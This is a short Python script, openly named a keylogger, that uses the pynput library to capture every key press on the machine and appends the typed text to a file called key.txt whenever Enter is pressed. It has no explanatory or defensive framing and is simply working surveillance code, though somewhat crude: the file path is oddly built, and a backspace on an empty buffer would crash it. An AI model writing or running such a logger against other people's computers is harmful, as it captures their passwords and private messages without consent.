from pynput.keyboard import  Key,  Listener 
import os 

keylist = []

class keylogger():
    
    def onpress(self, key):
        path = os.getcwd()
        filepath = path + '\ ' + 'key.txt'

        self._key = str(key)
        print(self._key)
        if self._key == 'Key.backspace':
                  keylist.pop(-1) 
                  print(keylist)
        elif self._key == 'Key.space': 
                  keylist.append('  ')
        elif self._key == 'Key.enter':
                  with open(filepath , 'a') as file:
                       file.write('\n')
                       for key in keylist:                         
                             file.write(key)  
                       file.close()
                  keylist.clear()
        else:
                  keylist.append(self._key)
                  print(keylist)




   
    def listen(self):
        with Listener(on_press = self.onpress ) as keylistener:
            keylistener.join()

        keylistener.start()

if __name__ == '__main__':
    keylogger = keylogger()
    keylogger.listen()
    
